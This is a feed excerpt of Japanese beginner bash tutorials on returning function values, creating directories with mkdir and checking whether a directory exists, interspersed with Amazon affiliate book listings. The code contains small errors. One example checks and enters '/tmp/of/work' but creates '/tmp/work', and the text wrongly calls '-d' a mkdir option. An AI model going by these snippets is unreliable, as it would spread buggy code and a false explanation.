&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２０．スクリプトからの戻り値を渡す】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript.jpg" alt="Featured image of post 【２０．スクリプトからの戻り値を渡す】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="関数からの戻り値の受け渡し">関数からの戻り値の受け渡し&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>関数からの戻り値の受け渡し：&lt;/b>&lt;/font>&lt;br>
Bash関数は、数値と文字列値の両方を渡すことができます。関数から文字列値を渡す方法を次の例に示します。&amp;lsquo;function_return.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加します。関数greeting（）は、文字列値を変数valに返します。この変数は、処理の最後に他の文字列と組み合わせて出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:function_return.sh" data-lang="bash:function_return.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">function&lt;/span> greeting&lt;span class="o">(){&lt;/span>
&lt;span class="nv">str&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;こんにちは、&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたの名前を入力して下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> name&lt;span class="p">;&lt;/span>
&lt;span class="nv">val&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>greeting&lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;関数からの戻り値は「&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">val&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">」です。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash function_return.sh
あなたの名前を入力して下さい
suzuki
関数からの戻り値は「こんにちは、suzuki」です。
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>戻り値について&lt;/dt>
&lt;dd>bashシェルスクリプトには「戻り値」というものは基本的に存在しない。&lt;/dd>
&lt;dd>
&lt;p>解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。&lt;/p>
&lt;/dd>
&lt;dd>「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２１．ディレクトリを作成する】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-21-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-21-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-21-suzuki/shellscript.jpg" alt="Featured image of post 【２１．ディレクトリを作成する】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="ディレクトリを作成する">ディレクトリを作成する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ディレクトリを作成する：&lt;/b>&lt;/font>&lt;br>
Bashは「mkdir」コマンドを使用して新しいディレクトリを作成します。&amp;lsquo;make_directory.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加して、ユーザーから新しいディレクトリ名を取得します。ディレクトリ名が現在の場所に存在しない場合は、ディレクトリが作成されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:make_directory.sh" data-lang="bash:make_directory.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ディレクトリ名を入力して下さい。&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> newdir
&lt;span class="sb">`&lt;/span>mkdir &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$newdir&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="sb">`&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash make_directory.sh
ディレクトリ名を入力して下さい。
suzuki
$ ls
suzuki/
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>よく記述していたのは以下のようなコードでした。&lt;/dd>
&lt;dd>事前にディレクトリの存在チェックを行い、見つからなかった場合のみディレクトリを作成します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir_example1.sh" data-lang="bash:mkdir_example1.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -d &lt;span class="s2">&amp;#34;/tmp/of/work&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
: &lt;span class="c1"># 何もしない&lt;/span>
&lt;span class="k">else&lt;/span>
mkdir -p &lt;span class="s2">&amp;#34;/tmp/work&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="nb">cd&lt;/span> &lt;span class="s2">&amp;#34;/tmp/of/work&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。&lt;/dd>
&lt;dd>mkdir -p コマンドは以下のような挙動をします。&lt;/dd>
&lt;dd>
&lt;p>作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する&lt;/p>
&lt;/dd>
&lt;dd>作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir_example2.sh" data-lang="bash:mkdir_example2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 一旦ディレクトリを作成&lt;/span>
mkdir -p /tmp/work
ls -l -d /tmp/work/
&lt;span class="c1"># 出力&lt;/span>
&lt;span class="c1"># drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/&lt;/span>
&lt;span class="c1"># オプション無しですでに存在しているディレクトリを作成&lt;/span>
mkdir /tmp/work
&lt;span class="c1"># 出力&lt;/span>
&lt;span class="c1"># mkdir: /tmp/work: File exists&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$?&lt;/span>
&lt;span class="c1"># 1&lt;/span>
&lt;span class="c1"># -pオプション有りだとエラーを吐かない&lt;/span>
mkdir -p /tmp/work
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$?&lt;/span>
&lt;span class="c1"># 0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bash
drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/
mkdir: /tmp/work: File exists
1
0
bash-5.1$
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２２．存在を確認してディレクトリを作成する】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-22-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-22-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-22-suzuki/shellscript.jpg" alt="Featured image of post 【２２．存在を確認してディレクトリを作成する】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="存在を確認してディレクトリを作成する">存在を確認してディレクトリを作成する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>存在を確認してディレクトリを作成します。&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;mkdir&amp;rsquo;コマンドを実行する前に、現在の場所にディレクトリが存在することを確認する事ができます。mkdir コマンドの&amp;rsquo; -d &amp;lsquo;オプションは、特定のディレクトリが存在するかどうかをテストするためのオプションです。&amp;lsquo;directory_exist.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加してください。ディレクトリの存在を確認してディレクトリを作成します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:directory_exist.sh" data-lang="bash:directory_exist.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ディレクトリ名を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> ndir&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -d &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$ndir&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ディレクトリが存在します。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="sb">`&lt;/span>mkdir &lt;span class="nv">$ndir&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ディレクトリを作成しました。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash directory_exist.sh
ディレクトリ名を入力して下さい。
suzuki
ディレクトリを作成しました。
$ ls
suzuki/
$ bash directory_exist.sh
ディレクトリ名を入力して下さい。
suzuki
ディレクトリが存在します。
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。&lt;/dd>
&lt;dd>mkdir -p コマンドは以下のような挙動をします。&lt;/dd>
&lt;dd>
